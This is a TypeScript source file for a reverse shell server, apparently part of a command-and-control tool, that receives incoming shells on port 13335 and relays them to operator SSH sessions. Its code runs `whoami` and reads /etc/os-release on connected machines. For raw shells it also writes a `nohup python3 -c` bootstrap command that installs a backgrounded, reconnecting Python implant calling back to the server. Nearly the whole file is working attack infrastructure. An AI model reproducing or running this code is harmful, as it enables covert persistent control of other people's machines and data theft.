import './ssh';
import './tunnel';

import * as net from 'net';
import fs from 'fs';
import path from 'path';
import { activeConnections, activeSSHConnections, ConnectionInfo } from './state';

const PORT = 13335;

const reverseShellServer = net.createServer();
const script = fs.readFileSync(path.join(__dirname, 'client.py'), 'utf-8');

// Bootstrap command: write client.py to /tmp and run as daemon with reconnect loop
const escapedScript = script.replace(/\\/g, '\\\\').replace(/'/g, "'\\''");

const sanitizeInput = (s: string) => s.replace(/[\x00-\x1f\x7f]/g, '');
const normalizeIp = (ip: string) => {
    const cleaned = ip.replace('::ffff:', '');
    if (cleaned === '::1') return '127.0.0.1';
    return cleaned;
};
const refreshAllBottomBars = () => activeSSHConnections.forEach(s => s.drawBottomBar());
const destroySocketSafe = (socket: net.Socket) => {
    try {
        socket.removeAllListeners();
        socket.destroy();
    } catch (e) { }
};

function startInfoCollection(socket: net.Socket, info: ConnectionInfo) {
    let isInfo = false;
    let infoBuf = '';
    info.collectingInfo = true;
    const infoCallback = (data: Buffer) => {
        const str = data.toString();
        if (str.includes('---START_INFO2---')) { infoBuf += str.split('---START_INFO2---')[1]; isInfo = true; }
        else if (isInfo) { infoBuf += str; }
        if (str.includes('---END_INFO2---') && isInfo) {
            infoBuf = infoBuf.split('---END_INFO2---')[0];
            for (const l of infoBuf.split(/[\r\n]/)) {
                if (l.startsWith('PRETTY_NAME=')) info.os = sanitizeInput(l.slice('PRETTY_NAME='.length).replace(/"/g, '').trim());
                else if (l.startsWith('WHOAMI=')) info.user = sanitizeInput(l.slice('WHOAMI='.length).trim());
            }
            info.collectingInfo = false;
            socket.off('data', infoCallback);
            refreshAllBottomBars();
            setTimeout(() => {
                socket.write(
                    'if which tmux > /dev/null 2>&1; then' +
                    ' printf "\\x1b[9198t";' +
                    ' tmux new-session -d -s omc 2>/dev/null;' +
                    ' tmux set -g mouse on;' +
                    ' if ! tmux list-clients -t omc 2>/dev/null | grep -q .; then tmux attach -t omc; fi;' +
                    ' else printf "\\x1b[9197t"; fi\n',
                );
            }, 300);
        }
    };
    socket.on('data', infoCallback);
    socket.write('echo ---START_INFO$[1+1]---\necho WHOAMI=$(whoami)\ncat /etc/os-release\necho ---END_INFO$[1+1]---\n');
    refreshAllBottomBars();
}

function attachSocket(connectionId: string, info: ConnectionInfo, socket: net.Socket) {
    info.socket = socket;
    socket.removeAllListeners('data');
    socket.removeAllListeners('close');
    socket.removeAllListeners('error');

    const interval = setInterval(() => {
        try { info.resize(info.rows, info.cols); } catch (e) { }
    }, 30000);

    socket.on('data', (rawData) => {
        let data = rawData;
        const rawStr = rawData.toString('binary');
        // Filter ping frames
        if (rawStr.includes('\x1b[9199t')) {
            const cleaned = rawStr.split('\x1b[9199t').join('');
            if (!cleaned) return;
            data = Buffer.from(cleaned, 'binary');
        }
        if (rawStr.includes('\x1b[9198t') || rawStr.includes('\x1b[9197t')) {
            if (rawStr.includes('\x1b[9198t')) {
                info.tmuxEnabled = true;
                info.tmuxCurrentWindow = 1;
                info.tmuxWindowCount = 1;
                activeSSHConnections.forEach(s => s.drawBottomBar());
            }
            const cleaned = rawStr.split('\x1b[9198t').join('').split('\x1b[9197t').join('');
            data = Buffer.from(cleaned, 'binary');
            if (!data.length) return;
        }
        // Skip terminal write and forwarding during info collection
        if (info.collectingInfo) return;
        info.terminal.write(data);
        console.log(`[${connectionId}] ${data.toString('hex')}`);
        activeSSHConnections.forEach((sshConn) => {
            if (sshConn.selectedId === connectionId && sshConn.stream) {
                sshConn.stream.write(data);
                if (data.toString().includes('\x1b[2J')) {
                    sshConn.drawBottomBar();
                }
            }
        });
    });

    socket.on('close', () => {
        console.log(`[-] Connection closed: ${connectionId}`);
        const info = activeConnections.get(connectionId);
        if (info) {
            info.disconnected = true;
            info.disconnectedAt = Date.now();
            // Auto-remove after 5 minutes if not reconnected
            setTimeout(() => {
                if (info.disconnected && activeConnections.get(connectionId) === info) {
                    console.log(`[-] Removing stale connection: ${connectionId}`);
                    activeConnections.delete(connectionId);
                    activeSSHConnections.forEach((sshState) => {
                        if (sshState.selectedId === connectionId) {
                            sshState.selectedId = null;
                            sshState.commandMode = true;
                            sshState.stream?.write('\r\n[connection timed out]\r\n');
                            sshState.stream?.write('\x1b[r');
                        }
                    });
                    refreshAllBottomBars();
                }
            }, 5 * 60 * 1000);
        }
        activeSSHConnections.forEach((sshState) => {
            if (sshState.selectedId === connectionId) {
                sshState.stream?.write('\r\n[disconnected, waiting for reconnect...]\r\n');
            }
        });
        refreshAllBottomBars();
        clearInterval(interval);
    });

    socket.on('error', (err) => {
        console.error(`[!] Socket error on ${connectionId}: ${err.message}`);
        clearInterval(interval);
    });
}

reverseShellServer.on('connection', (socket) => {
    console.log(`[+] New connection from ${socket.remoteAddress}:${socket.remotePort}`);

    // Read first line to determine if this is a HELLO handshake or legacy raw shell
    let headerBuf = Buffer.alloc(0);
    let legacyHandled = false;

    const handleLegacy = () => {
        if (legacyHandled) return;
        legacyHandled = true;
        // Legacy raw shell (no python): use this connection directly as a shell
        const connectionId = `${socket.remoteAddress}:${socket.remotePort}`;
        console.log(`[*] Legacy raw shell connection: ${connectionId}`);
        const info = new ConnectionInfo(socket, '', '');
        activeConnections.set(connectionId, info);
        attachSocket(connectionId, info, socket);
        startInfoCollection(socket, info);

        // Clean up on close for legacy connections (no reconnect)
        socket.on('close', () => {
            activeConnections.delete(connectionId);
            activeSSHConnections.forEach((sshState) => {
                if (sshState.selectedId === connectionId) {
                    sshState.selectedId = null;
                    sshState.commandMode = true;
                    sshState.tmuxInterceptMode = false;
                }
            });
            refreshAllBottomBars();
        });

        // Also try to bootstrap python client in background for future reconnects
        // Send bootstrap BEFORE tmux attaches (info collection sends tmux attach later)
        const serverIp = (socket.localAddress ?? '127.0.0.1').replace('::ffff:', '');
        const bootstrapCommand = `nohup python3 -c '${escapedScript}' ${serverIp} ${PORT} </dev/null >/dev/null 2>&1 &\n`;
        socket.write(bootstrapCommand);

        // Replay buffered data
        if (headerBuf.length) socket.emit('data', headerBuf);
    };

    // If no newline within 500ms, treat as legacy
    const legacyTimer = setTimeout(() => {
        socket.off('data', onHeader);
        handleLegacy();
    }, 1000);

    const onHeader = (chunk: Buffer) => {
        headerBuf = Buffer.concat([headerBuf, chunk]);
        const nl = headerBuf.indexOf('OLLEH');
        if (nl === -1) return;

        clearTimeout(legacyTimer);
        socket.off('data', onHeader);
        const line = headerBuf.subarray(0, nl).toString('binary').trim();
        const rest = headerBuf.subarray(nl + 5);

        if (line.startsWith('HELLO ')) {
            // Format: HELLO <clientId> <whoami> <os_name> [TMUX]
            const hasTmux = line.endsWith(' TMUX');
            const payload = hasTmux ? line.slice(6, -5) : line.slice(6);
            const parts = payload.split(' ');
            const clientId = sanitizeInput(parts[0]);
            const whoami = sanitizeInput(parts[1] ?? '');
            const osName = sanitizeInput(parts.slice(2).join(' '));
            console.log(`[+] HELLO from client_id=${clientId} user=${whoami} os=${osName} tmux=${hasTmux}`);

            // Clean up ALL legacy connections from same IP
            const remoteIp = normalizeIp(socket.remoteAddress ?? '');
            for (const [connId, connInfo] of activeConnections) {
                // Legacy connections use ip:port format as key
                if (!connId.includes(':')) continue;
                const connIp = normalizeIp(connInfo.socket?.remoteAddress ?? '');
                if (connIp !== remoteIp) continue;
                console.log(`[*] Cleaning up legacy connection: ${connId}`);
                destroySocketSafe(connInfo.socket);
                activeConnections.delete(connId);
                // Reset any SSH sessions that were viewing this legacy connection
                for (const [, sshState] of activeSSHConnections) {
                    if (sshState.selectedId !== connId) continue;
                    sshState.selectedId = null;
                    sshState.commandMode = true;
                    sshState.stream?.write('\x1b[2J\x1b[H');
                    sshState.stream?.write('\x1b[r');
                    sshState.stream?.write('[legacy connection upgraded to python client]\r\n');
                };
            }

            const existing = activeConnections.get(clientId);
            if (existing) {
                // Reconnect: reuse existing ConnectionInfo, swap socket
                console.log(`[*] Reconnect: restoring session for ${clientId}`);
                destroySocketSafe(existing.socket);
                if (hasTmux) existing.tmuxEnabled = true;
                existing.disconnected = false;
                existing.disconnectedAt = 0;
                existing.socket = socket;
                attachSocket(clientId, existing, socket);
                for (const [, sshState] of activeSSHConnections) {
                    if (sshState.selectedId !== clientId) continue;
                    sshState.stream?.write('\r\n[reconnected]\r\n');
                    if (sshState.rows && sshState.cols) {
                        existing.terminal.resize(sshState.cols, sshState.rows - 1);
                        sshState.stream?.write('\x1b[2J\x1b[H');
                        sshState.stream?.write(`\x1b[1;${sshState.rows - 1}r`);
                        sshState.stream?.write(existing.serializeAddon.serialize());
                    }
                };
            } else {
                // New python client
                const info = new ConnectionInfo(socket, whoami, osName);
                if (hasTmux) info.tmuxEnabled = true;
                activeConnections.set(clientId, info);
                attachSocket(clientId, info, socket);
            }

            refreshAllBottomBars();
            // Replay any buffered data after the header
            if (rest.length) socket.emit('data', rest);

        } else {
            // Not a HELLO — treat as legacy
            handleLegacy();
        }
    };

    socket.on('data', onHeader);
    socket.on('error', () => { });
});

reverseShellServer.listen(PORT, () => {
    console.log(`[*] Reverse shell server listening on port ${PORT}`);
    console.log('[*] Waiting for reverse shell connections...');
});

// 生成SSH密钥对（如果不存在）
